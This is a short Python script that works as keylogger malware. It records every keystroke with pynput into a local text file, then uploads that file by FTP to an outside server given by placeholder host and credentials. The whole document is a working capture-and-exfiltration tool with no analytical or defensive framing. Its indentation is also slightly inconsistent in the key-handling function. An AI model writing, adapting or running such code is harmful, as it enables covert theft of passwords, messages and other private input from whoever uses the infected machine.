# # keylogging and saving in a text file
from pynput.keyboard import Listener
def log_keystroke(key):
     key = str(key).replace("'", "")
     if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    with open("Keylogger.txt", 'a') as f:
        f.write(key)
with Listener(on_press=log_keystroke) as l:
    l.join()

###upload file to an ftp server

import ftplib

# FTP server credentials
FTP_HOST = "ftp.yourhost.com"
FTP_USER = "yourusername@yourhost.com"
FTP_PASS = "yourpassword"

# connect to the FTP server
ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
# force UTF-8 encoding
ftp.encoding = "utf-8"
# local file name you want to upload
filename = "Keylogger.txt"
with open(filename, "rb") as file:
    # use FTP's STOR command to upload the file
    ftp.storbinary(f"STOR {filename}", file)
# list current files & directories
ftp.dir()
# quit and close the connection
ftp.quit()
